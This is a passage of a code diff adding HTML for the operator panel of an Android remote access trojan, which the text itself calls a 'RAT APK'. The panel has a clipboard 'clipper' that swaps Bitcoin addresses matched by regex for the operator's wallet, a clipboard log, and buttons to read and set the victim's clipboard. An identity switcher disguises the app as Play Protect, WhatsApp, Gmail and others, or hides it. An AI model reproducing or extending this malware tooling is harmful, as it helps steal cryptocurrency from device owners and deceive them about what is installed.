+              </label>
+            </div>
+          </div>
+
+          <div class="card">
+            <div class="card-title">Replacement Rules</div>
+            <div id="clipper-rules">
+              <!-- Rules rendered by JS -->
+            </div>
+            <div class="sep-h"></div>
+            <div class="card-title" style="margin-top:8px;">Add Rule</div>
+            <div class="grid-2" style="gap:10px; margin-bottom:10px;">
+              <div class="input-group">
+                <label>Match (regex or prefix)</label>
+                <input type="text" id="clip-match" placeholder="^1[A-HJ-NP-Z0-9]{25,34}$" />
+              </div>
+              <div class="input-group">
+                <label>Replace With</label>
+                <input type="text" id="clip-replace" placeholder="Your wallet address" />
+              </div>
+            </div>
+            <div class="btn-group">
+              <button class="btn btn-accent btn-sm" onclick="App.addClipperRule()">Add Rule</button>
+              <button class="btn btn-sm" onclick="App.cmd('GET_CLIPBOARD')">Read Clipboard</button>
+              <button class="btn btn-sm" onclick="App.setClipboard()">Set Clipboard…</button>
+            </div>
+          </div>
+
+          <div class="card">
+            <div class="card-title">Clipboard Log</div>
+            <div id="clipboard-log" style="font-family:var(--font-mono); font-size:11px; max-height:200px; overflow-y:auto;">
+              <div class="empty-state">No clipboard events captured</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- ─────────────────── IDENTITY ─────────────────── -->
+        <div class="tab-pane" id="tab-identity">
+          <div class="card">
+            <div class="card-title">App Identity Switcher</div>
+            <p style="font-size:12px; color:var(--text-muted); margin-bottom:14px;">
+              Changes the visible name and icon of the RAT APK on the device.
+            </p>
+            <div class="identity-grid">
+              <div class="identity-btn" data-identity="Default" onclick="App.setIdentity('Default')">
+                <div class="identity-icon">🤖</div>Default
+              </div>
+              <div class="identity-btn" data-identity="PlayStore" onclick="App.setIdentity('PlayStore')">
+                <div class="identity-icon">🏪</div>Play Store
+              </div>
+              <div class="identity-btn" data-identity="PlayProtect" onclick="App.setIdentity('PlayProtect')">
+                <div class="identity-icon">🛡</div>Play Protect
+              </div>
+              <div class="identity-btn" data-identity="Settings" onclick="App.setIdentity('Settings')">
+                <div class="identity-icon">⚙️</div>Settings
+              </div>
+              <div class="identity-btn" data-identity="WhatsApp" onclick="App.setIdentity('WhatsApp')">
+                <div class="identity-icon">💬</div>WhatsApp
+              </div>
+              <div class="identity-btn" data-identity="Telegram" onclick="App.setIdentity('Telegram')">
+                <div class="identity-icon">✈️</div>Telegram
+              </div>
+              <div class="identity-btn" data-identity="Calculator" onclick="App.setIdentity('Calculator')">
+                <div class="identity-icon">🧮</div>Calculator
+              </div>
+              <div class="identity-btn" data-identity="Facebook" onclick="App.setIdentity('Facebook')">
+                <div class="identity-icon">📘</div>Facebook
+              </div>
+              <div class="identity-btn" data-identity="Weather" onclick="App.setIdentity('Weather')">
+                <div class="identity-icon">🌤</div>Weather
+              </div>
+              <div class="identity-btn" data-identity="Notes" onclick="App.setIdentity('Notes')">
+                <div class="identity-icon">📝</div>Notes
+              </div>
+              <div class="identity-btn" data-identity="TikTok" onclick="App.setIdentity('TikTok')">
+                <div class="identity-icon">🎵</div>TikTok
+              </div>
+              <div class="identity-btn" data-identity="Chrome" onclick="App.setIdentity('Chrome')">
+                <div class="identity-icon">🌐</div>Chrome
+              </div>
+              <div class="identity-btn" data-identity="Gmail" onclick="App.setIdentity('Gmail')">
+                <div class="identity-icon">📧</div>Gmail
+              </div>
+              <div class="identity-btn" data-identity="Hidden" onclick="App.setIdentity('Hidden')">
+                <div class="identity-icon">👁</div>Hidden
+              </div>
+            </div>
+          </div>
+
+          <div class="card" style="margin-top:12px;">
+            <div class="card-title">Current Identity</div>
+            <div class="info-row">
+              <span class="info-label">Active</span>
+              <span class="info-value" id="identity-current">Unknown</span>
+            </div>
+          </div>
+        </div>
+
+      </div><!-- /tab-content -->
+    </div><!-- /bot-panel -->
+  </main>
+</div><!-- /root -->
+
+<!-- Toast container -->
+<div id="toast-wrap"></div>
+
+<script src="app.js"></script>
+</body>
+</html>
